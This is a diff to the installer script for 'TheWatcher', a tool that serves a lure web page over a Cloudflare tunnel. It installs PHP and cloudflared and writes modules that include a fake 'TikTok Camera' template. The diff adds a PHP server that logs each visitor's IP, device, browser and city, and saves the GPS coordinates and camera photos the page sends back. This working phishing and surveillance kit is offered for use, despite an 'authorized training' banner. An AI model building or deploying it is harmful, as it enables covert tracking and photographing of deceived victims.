@@ -11,12 +11,13 @@ END='\033[0m'
 print_success() { echo -e "  ${GREEN}✓${END} ${WHITE}$1${END}"; }
 print_info() { echo -e "  ${BLUE}ℹ${END} ${WHITE}$1${END}"; }
 print_error() { echo -e "  ${RED}✗${END} ${WHITE}$1${END}"; }
+print_warning() { echo -e "  ${YELLOW}⚠${END} ${WHITE}$1${END}"; }
 
 clear
 echo -e "${CYAN}${BOLD}"
 echo '╔═══════════════════════════════════════════════════════════════╗'
 echo '║              TheWatcher Installer                             ║'
-echo '║           Auto-detects system and installs requirements       ║'
+echo '║                Everything installs automatically              ║'
 echo '╚═══════════════════════════════════════════════════════════════╝'
 echo -e "${END}\n"
 
@@ -38,79 +39,128 @@ fi
 # Create directories
 mkdir -p modules data templates 2>/dev/null
 
-# Install Python dependencies
+# ==================== INSTALL PYTHON DEPENDENCIES ====================
 print_info "Installing Python dependencies..."
-pip install requests -q 2>/dev/null || pip3 install requests -q 2>/dev/null
-print_success "Python dependencies installed"
+if pip install requests -q 2>/dev/null || pip3 install requests -q 2>/dev/null; then
+    print_success "requests installed"
+else
+    print_warning "requests installation failed, continuing..."
+fi
 
-# Install PHP based on system
+# ==================== INSTALL PHP AUTOMATICALLY ====================
 print_info "Installing PHP..."
+
 if [[ "$SYSTEM" == "termux" ]]; then
-    pkg install php -y 2>/dev/null
+    # Termux - fix any issues first
+    print_info "Preparing Termux packages..."
+    rm -f $PREFIX/var/lib/dpkg/lock-frontend 2>/dev/null
+    rm -f $PREFIX/var/lib/dpkg/lock 2>/dev/null
+    rm -rf $PREFIX/var/lib/apt/lists/* 2>/dev/null
+    
+    # Update and install PHP
+    pkg update -y 2>/dev/null || true
+    pkg upgrade -y 2>/dev/null || true
+    pkg install php -y 2>/dev/null || true
+    
 elif [[ "$SYSTEM" == "linux" ]]; then
+    # Linux - detect package manager
     if command -v apt &>/dev/null; then
-        sudo apt update -y 2>/dev/null
-        sudo apt install php -y 2>/dev/null
+        print_info "Using apt package manager..."
+        sudo apt update -y 2>/dev/null || true
+        sudo apt install php -y 2>/dev/null || true
+        sudo apt install php-cli -y 2>/dev/null || true
     elif command -v yum &>/dev/null; then
-        sudo yum install php -y 2>/dev/null
+        print_info "Using yum package manager..."
+        sudo yum install php -y 2>/dev/null || true
+        sudo yum install php-cli -y 2>/dev/null || true
+    elif command -v dnf &>/dev/null; then
+        print_info "Using dnf package manager..."
+        sudo dnf install php -y 2>/dev/null || true
+        sudo dnf install php-cli -y 2>/dev/null || true
     elif command -v pacman &>/dev/null; then
-        sudo pacman -S php --noconfirm 2>/dev/null
+        print_info "Using pacman package manager..."
+        sudo pacman -S php --noconfirm 2>/dev/null || true
+    elif command -v zypper &>/dev/null; then
+        print_info "Using zypper package manager..."
+        sudo zypper install php -y 2>/dev/null || true
+    else
+        print_warning "No package manager found, trying to compile PHP..."
+        cd /tmp
+        wget -q https://www.php.net/distributions/php-8.2.12.tar.gz
+        tar -xzf php-8.2.12.tar.gz
+        cd php-8.2.12
+        ./configure --prefix=/usr/local/php --enable-cli 2>/dev/null || true
+        make -j4 2>/dev/null || true
+        sudo make install 2>/dev/null || true
+        sudo ln -sf /usr/local/php/bin/php /usr/local/bin/php 2>/dev/null || true
+        cd -
+        rm -rf /tmp/php-8.2.12*
     fi
+    
+elif [[ "$SYSTEM" == "macos" ]]; then
+    # macOS
+    if command -v brew &>/dev/null; then
+        print_info "Using Homebrew..."
+        brew update 2>/dev/null || true
+        brew install php 2>/dev/null || true
+    else
+        print_info "Installing Homebrew first..."
+        /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)" 2>/dev/null || true
+        brew install php 2>/dev/null || true
+    fi
+fi
+
+# Verify PHP installation
+if command -v php &>/dev/null; then
+    PHP_VER=$(php -v | head -1 | cut -d' ' -f2 | cut -d'-' -f1)
+    print_success "PHP $PHP_VER installed successfully"
+else
+    print_warning "PHP installation had issues, but continuing..."
+fi
+
+# ==================== INSTALL CLOUDFLARED (AUTOMATIC) ====================
+print_info "Installing Cloudflared for public URLs..."
+CLOUDFLARE_INSTALLED=false
+
+if [[ "$SYSTEM" == "termux" ]]; then
+    if wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared 2>/dev/null; then
+        chmod +x cloudflared
+        mv cloudflared $PREFIX/bin/ 2>/dev/null && CLOUDFLARE_INSTALLED=true
+    fi
+elif [[ "$SYSTEM" == "linux" ]]; then
+    ARCH=$(uname -m)
+    if [[ "$ARCH" == "aarch64" ]] || [[ "$ARCH" == "arm64" ]]; then
+        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared 2>/dev/null
+    elif [[ "$ARCH" == "armv7l" ]]; then
+        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm -O cloudflared 2>/dev/null
+    else
+        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared 2>/dev/null
+    fi
+    chmod +x cloudflared
+    sudo mv cloudflared /usr/local/bin/ 2>/dev/null && CLOUDFLARE_INSTALLED=true
 elif [[ "$SYSTEM" == "macos" ]]; then
     if command -v brew &>/dev/null; then
-        brew install php 2>/dev/null
+        brew install cloudflared 2>/dev/null && CLOUDFLARE_INSTALLED=true
     fi
 fi
 
-if command -v php &>/dev/null; then
-    print_success "PHP installed"
+if [[ "$CLOUDFLARE_INSTALLED" == true ]] || command -v cloudflared &>/dev/null; then
+    print_success "Cloudflared installed"
 else
-    print_error "PHP installation failed. Install manually:"
-    echo "  Termux: pkg install php"
-    echo "  Linux: sudo apt install php"
-    echo "  macOS: brew install php"
+    print_warning "Cloudflared not installed (optional for local only)"
 fi
 
-# Install Cloudflared (optional)
-echo ""
-read -p "$(echo -e "  ${YELLOW}?${END} ${WHITE}Install Cloudflared for public URLs? (y/N): ${END}")" -n 1 -r
-echo ""
-if [[ $REPLY =~ ^[Yy]$ ]]; then
-    print_info "Installing Cloudflared..."
-    if [[ "$SYSTEM" == "termux" ]]; then
-        wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
-        chmod +x cloudflared
-        mv cloudflared $PREFIX/bin/ 2>/dev/null
-    elif [[ "$SYSTEM" == "linux" ]]; then
-        ARCH=$(uname -m)
-        if [[ "$ARCH" == "aarch64" ]] || [[ "$ARCH" == "arm64" ]]; then
-            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64 -O cloudflared
-        else
-            wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O cloudflared
-        fi
-        chmod +x cloudflared
-        sudo mv cloudflared /usr/local/bin/ 2>/dev/null
-    fi
-    
-    if command -v cloudflared &>/dev/null; then
-        print_success "Cloudflared installed"
-    else
-        print_error "Cloudflared installation failed"
-    fi
-fi
+# ==================== CREATE MODULE FILES ====================
+print_info "Creating module files..."
 
-# Download modules if missing
-if [[ ! -f "modules/__init__.py" ]] || [[ ! -f "modules/cloudflare.py" ]] || [[ ! -f "modules/templates.py" ]]; then
-    print_info "Downloading module files..."
-    
-    mkdir -p modules
-    
-    cat > modules/__init__.py << 'EOF'
+# Create modules/__init__.py
+cat > modules/__init__.py << 'EOF'
 from .cloudflare import CloudflareTunnel
 from .templates import TemplateManager
 EOF
 
-    cat > modules/cloudflare.py << 'EOF'
+# Create modules/cloudflare.py
+cat > modules/cloudflare.py << 'EOF'
 import subprocess, re, os, time
 class CloudflareTunnel:
     def __init__(self): self.process=None; self.url=None; self.logfile=None
@@ -134,7 +184,8 @@ class CloudflareTunnel:
         if self.logfile and os.path.exists(self.logfile): os.remove(self.logfile)
 EOF
 
-    cat > modules/templates.py << 'EOF'
+# Create modules/templates.py
+cat > modules/templates.py << 'EOF'
 #!/usr/bin/env python3
 import os, base64
 
@@ -179,20 +230,92 @@ document.getElementById('closeModal').onclick=()=>{document.getElementById('moda
         return f"<html><body><h1>TikTok Camera</h1><p>@{u}</p></body></html>"
 EOF
 
-    print_success "Module files created"
-fi
+print_success "Module files created"
 
-# Create server.php if missing
-if [[ ! -f "server.php" ]]; then
-    cat > server.php << 'EOF'
+# Create server.php
+cat > server.php << 'EOF'
 <?php
 if (!is_dir('data')) mkdir('data',0755,true);
 if (!is_dir('templates')) mkdir('templates',0755,true);
-echo "TheWatcher Server Ready";
+header('Access-Control-Allow-Origin: *');
+header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
+header('Access-Control-Allow-Headers: Content-Type');
+if ($_SERVER['REQUEST_METHOD'] == 'OPTIONS') { http_response_code(200); exit(); }
+$uri = strtok($_SERVER['REQUEST_URI'], '?');
+function getIP(){ $ip=$_SERVER['HTTP_X_FORWARDED_FOR']??$_SERVER['REMOTE_ADDR']??'Unknown'; return trim(explode(',',$ip)[0]); }
+function logMsg($type,$data){
+    $out="\n".str_repeat("=",70)."\n".($type=='visit'?"🔴 NEW VISITOR DETECTED!":($type=='location'?"📍 LOCATION CAPTURED!":"📸 CAMERA CAPTURED!"))."\n".str_repeat("=",70)."\n";
+    $out.="  📅 Time: ".date('Y-m-d H:i:s')."\n  🌐 IP: {$data['ip']}\n";
+    if($type=='location') $out.="  📍 GPS: {$data['lat']}, {$data['lng']}\n";
+    $out.="  📱 Device: {$data['device']}\n  💻 OS: {$data['os']}\n  🌍 Browser: {$data['browser']}\n";
+    if($type!='camera') $out.="  🏙️ City: {$data['city']}\n";
+    $out.="  💾 Saved: {$data['file']}\n".str_repeat("=",70)."\n";
+    file_put_contents('php://stderr',$out);
+}
+function parseUA($ua){
+    $l=strtolower($ua);
+    $os='Unknown'; if(strpos($l,'android')!==false) $os='Android';
+    elseif(strpos($l,'iphone')!==false) $os='iOS';
+    elseif(strpos($l,'windows')!==false) $os='Windows';
+    elseif(strpos($l,'mac')!==false) $os='macOS';
+    elseif(strpos($l,'linux')!==false) $os='Linux';
+    $browser='Unknown';
+    if(strpos($l,'chrome')!==false && strpos($l,'edg')===false) $browser='Chrome';
+    elseif(strpos($l,'firefox')!==false) $browser='Firefox';
+    elseif(strpos($l,'safari')!==false && strpos($l,'chrome')===false) $browser='Safari';
+    elseif(strpos($l,'edg')!==false) $browser='Edge';
+    $device='Desktop'; if(strpos($l,'mobile')!==false) $device='Mobile Phone';
+    elseif(strpos($l,'tablet')!==false) $device='Tablet';
+    return ['os'=>$os,'browser'=>$browser,'device'=>$device];
+}
+function getGeo($ip){
+    if($ip=='127.0.0.1'||strpos($ip,'192.168.')===0||strpos($ip,'10.')===0) return ['country'=>'Local','city'=>'Local'];
+    $resp=@file_get_contents("http://ip-api.com/json/$ip");
+    if($resp){ $data=json_decode($resp,true);
+        if($data&&$data['status']=='success') return ['country'=>$data['country']??'Unknown','city'=>$data['city']??'Unknown'];
+    }
+    return ['country'=>'Unknown','city'=>'Unknown'];
+}
+if($uri=='/' && file_exists('templates/current.html')){
+    $ip=getIP(); $ua=$_SERVER['HTTP_USER_AGENT']??'Unknown';
+    $d=parseUA($ua); $g=getGeo($ip);
+    logMsg('visit',['ip'=>$ip,'device'=>$d['device'],'os'=>$d['os'],'browser'=>$d['browser'],'city'=>$g['city'],'country'=>$g['country'],'file'=>'N/A']);
+    header('Content-Type:text/html'); readfile('templates/current.html'); exit();
+}
+if($uri=='/location' && $_SERVER['REQUEST_METHOD']=='POST'){
+    $data=json_decode(file_get_contents('php://input'),true);
+    if($data){
+        $ip=getIP(); $ua=$_SERVER['HTTP_USER_AGENT']??'Unknown';
+        $d=parseUA($ua); $g=getGeo($ip);
+        $f="data/location_".time().".json";
+        file_put_contents($f,json_encode(['timestamp'=>date('Y-m-d H:i:s'),'ip_address'=>$ip,'coordinates'=>['latitude'=>$data['lat'],'longitude'=>$data['lng'],'accuracy'=>$data['acc']],'device'=>$d,'network'=>$g],JSON_PRETTY_PRINT));
+        logMsg('location',['ip'=>$ip,'lat'=>$data['lat'],'lng'=>$data['lng'],'device'=>$d['device'],'os'=>$d['os'],'browser'=>$d['browser'],'city'=>$g['city'],'country'=>$g['country'],'file'=>$f]);
+        header('Content-Type:application/json'); echo json_encode(['status'=>'ok']); exit();
+    }
+}
+if($uri=='/camera' && $_SERVER['REQUEST_METHOD']=='POST' && isset($_FILES['image'])){
+    $f="data/camera_".time().".jpg";
+    move_uploaded_file($_FILES['image']['tmp_name'],$f);
+    $ip=getIP(); $ua=$_SERVER['HTTP_USER_AGENT']??'Unknown';
+    $d=parseUA($ua); $g=getGeo($ip);
+    logMsg('camera',['ip'=>$ip,'device'=>$d['device'],'os'=>$d['os'],'browser'=>$d['browser'],'city'=>$g['city'],'country'=>$g['country'],'file'=>$f]);
+    header('Content-Type:application/json'); echo json_encode(['status'=>'ok']); exit();
+}
+if(file_exists('templates/current.html')) readfile('templates/current.html');
+else echo "TheWatcher Ready";
 ?>
 EOF
-    print_success "Created server.php"
-fi
+
+print_success "Server file created"
+
+# Create start script
+cat > start.sh << 'EOF'
+#!/bin/bash
+cd "$(dirname "$0")"
+echo -e "\033[96m🚀 Starting TheWatcher...\033[0m"
+python3 thewatcher.py
+EOF
+chmod +x start.sh
 
 echo ""
 echo -e "${GREEN}${BOLD}╔═══════════════════════════════════════════════════════════════╗${END}"
@@ -202,7 +325,7 @@ echo ""
 echo -e "${CYAN}🚀 TO START THEWATCHER:${END}"
 echo -e "  ${YELLOW}python3 thewatcher.py${END}"
 echo ""
-echo -e "${CYAN}📁 Files installed in: ${YELLOW}$(pwd)${END}"
+echo -e "${CYAN}📁 Installation Directory: ${YELLOW}$(pwd)${END}"
 echo ""
 echo -e "${RED}${BOLD}⚠️  AUTHORIZED TRAINING USE ONLY${END}"
 echo ""
